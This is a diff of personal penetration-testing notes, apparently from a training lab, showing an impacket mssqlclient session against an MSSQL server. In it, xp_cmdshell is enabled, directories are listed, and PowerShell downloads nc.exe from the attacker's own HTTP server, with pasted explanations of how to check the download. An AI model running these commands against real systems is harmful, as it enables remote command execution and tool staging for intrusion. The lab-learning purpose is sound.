@@ -267,7 +267,322 @@ dpapi.py           GetLAPSPassword.py  kintercept.py     ntfs-read.py      regis
 DumpNTLMInfo.py    GetNPUsers.py       lookupsid.py      ntlmrelayx.py     reg.py            smbserver.py    wmiquery.py
 esentutl.py        getPac.py           machine_role.py   owneredit.py      rpcdump.py        sniffer.py
                                                                                                                                  
+                                                                                                                                 
 ┌──(root㉿kali)-[~/impacket/examples]
-└─# py mssqlclient.py ARCHETYPE/sql_svc@$ip -windows-auth
+└─# py mssqlclient.py ARCHETYPE/sql_svc@$ip -windows-auth     
 Impacket v0.12.0.dev1 - Copyright 2023 Fortra
 
+Password:
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
+[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
+[!] Press help for extra shell commands
+SQL (ARCHETYPE\sql_svc  dbo@master)> help
+
+    lcd {path}                 - changes the current local directory to {path}
+    exit                       - terminates the server process (and this session)
+    enable_xp_cmdshell         - you know what it means
+    disable_xp_cmdshell        - you know what it means
+    enum_db                    - enum databases
+    enum_links                 - enum linked servers
+    enum_impersonate           - check logins that can be impersonated
+    enum_logins                - enum login users
+    enum_users                 - enum current db users
+    enum_owner                 - enum db owner
+    exec_as_user {user}        - impersonate with execute as user
+    exec_as_login {login}      - impersonate with execute as login
+    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
+    xp_dirtree {path}          - executes xp_dirtree on the path
+    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
+    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    ! {cmd}                    - executes a local shell cmd
+    show_query                 - show query
+    mask_query                 - mask query
+    
+SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');
+    
+-   
+1   
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'cd'
+output                
+-------------------   
+C:\Windows\system32   
+
+NULL                  
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> 
+
+
+
+
+
+    
+SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
+[*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
+SQL (ARCHETYPE\sql_svc  dbo@master)> SELECT is_srvrolemember('sysadmin');
+    
+-   
+1   
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'cd'
+output                
+-------------------   
+C:\Windows\system32   
+
+NULL                  
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\'
+output                                                       
+----------------------------------------------------------   
+ Volume in drive C has no label.                             
+
+ Volume Serial Number is 9565-0B4F                           
+
+NULL                                                         
+
+ Directory of C:\                                            
+
+NULL                                                         
+
+01/20/2020  05:20 AM    <DIR>          backups               
+
+07/27/2021  02:28 AM    <DIR>          PerfLogs              
+
+07/27/2021  03:20 AM    <DIR>          Program Files         
+
+07/27/2021  03:20 AM    <DIR>          Program Files (x86)   
+
+01/19/2020  11:39 PM    <DIR>          Users                 
+
+07/27/2021  03:22 AM    <DIR>          Windows               
+
+               0 File(s)              0 bytes                
+
+               6 Dir(s)  10,722,205,696 bytes free           
+
+NULL                                                         
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\Users'
+output                                                 
+----------------------------------------------------   
+ Volume in drive C has no label.                       
+
+ Volume Serial Number is 9565-0B4F                     
+
+NULL                                                   
+
+ Directory of C:\Users                                 
+
+NULL                                                   
+
+01/19/2020  04:10 PM    <DIR>          .               
+
+01/19/2020  04:10 PM    <DIR>          ..              
+
+01/19/2020  11:39 PM    <DIR>          Administrator   
+
+01/19/2020  11:39 PM    <DIR>          Public          
+
+01/20/2020  06:01 AM    <DIR>          sql_svc         
+
+               0 File(s)              0 bytes          
+
+               5 Dir(s)  10,722,205,696 bytes free     
+
+NULL                                                   
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\Users\public'
+output                                               
+--------------------------------------------------   
+ Volume in drive C has no label.                     
+
+ Volume Serial Number is 9565-0B4F                   
+
+NULL                                                 
+
+ Directory of C:\Users\public                        
+
+NULL                                                 
+
+01/19/2020  11:39 PM    <DIR>          .             
+
+01/19/2020  11:39 PM    <DIR>          ..            
+
+01/19/2020  11:39 PM    <DIR>          Documents     
+
+09/15/2018  12:12 AM    <DIR>          Downloads     
+
+09/15/2018  12:12 AM    <DIR>          Music         
+
+09/15/2018  12:12 AM    <DIR>          Pictures      
+
+09/15/2018  12:12 AM    <DIR>          Videos        
+
+               0 File(s)              0 bytes        
+
+               7 Dir(s)  10,722,205,696 bytes free   
+
+NULL                                                 
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'dir C:\Users\public\Downloads'
+output                                               
+--------------------------------------------------   
+ Volume in drive C has no label.                     
+
+ Volume Serial Number is 9565-0B4F                   
+
+NULL                                                 
+
+ Directory of C:\Users\public\Downloads              
+
+NULL                                                 
+
+09/15/2018  12:12 AM    <DIR>          .             
+
+09/15/2018  12:12 AM    <DIR>          ..            
+
+               0 File(s)              0 bytes        
+
+               2 Dir(s)  10,722,205,696 bytes free   
+
+NULL                                                 
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'powershell Invoke-WebRequest -Uri http://10.10.16.39:8080/nc.exe -OutFile C:\Users\Public\Downloads\nc.exe'
+output   
+------   
+NULL     
+
+SQL (ARCHETYPE\sql_svc  dbo@master)> 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                 
+┌──(root㉿kali)-[~]
+└─# updatedb
+                                                                                                                                 
+┌──(root㉿kali)-[~]
+└─# locate nc.exe
+/usr/share/windows-resources/binaries/nc.exe
+                                                                                                                                 
+┌──(root㉿kali)-[~]
+└─# mkdir server
+                                                                                                                                 
+┌──(root㉿kali)-[~]
+└─# cd server
+                                                                                                                                 
+┌──(root㉿kali)-[~/server]
+└─# cp /usr/share/windows-resources/binaries/nc.exe nc.exe
+                                                                                                                                 
+┌──(root㉿kali)-[~/server]
+└─# python3 -m http.server 8080
+Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
+10.129.117.121 - - [02/Oct/2024 16:19:15] "GET /nc.exe HTTP/1.1" 200 -
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+To check if `nc.exe` has been downloaded to `C:\Users\Public\Downloads`, you can use PowerShell to verify its existence.
+
+### Check if the File Exists
+
+1. **Open PowerShell.**
+
+2. **Run the following command:**
+
+   ```powershell
+   Test-Path C:\Users\Public\Downloads\nc.exe
+   ```
+
+### Expected Results
+
+- If the file exists, the command will return `True`.
+- If the file does not exist, it will return `False`.
+
+### Example Output
+
+```powershell
+True  # If the file exists
+False # If the file does not exist
+```
+
+
+
+
+
+
+
+To check if `nc.exe` has been downloaded to `C:\Users\Public\Downloads` using the Command Prompt (cmd), you can use the `dir` command. Here’s how:
+
+### Steps to Check in Command Prompt
+
+1. **Open Command Prompt**: Press `Win + R`, type `cmd`, and press Enter.
+
+2. **Run the following command**:
+
+   ```cmd
+   dir C:\Users\Public\Downloads\nc.exe
+   ```
+
+### Expected Results
+
+- If the file exists, you will see information about the file, including its size and date modified.
+- If the file does not exist, you will see a message like:
+
+   ```
+   File Not Found
+   ```
+
+### Example Command
+
+Here’s what it looks like in the Command Prompt:
+
+```cmd
+C:\> dir C:\Users\Public\Downloads\nc.exe
+```
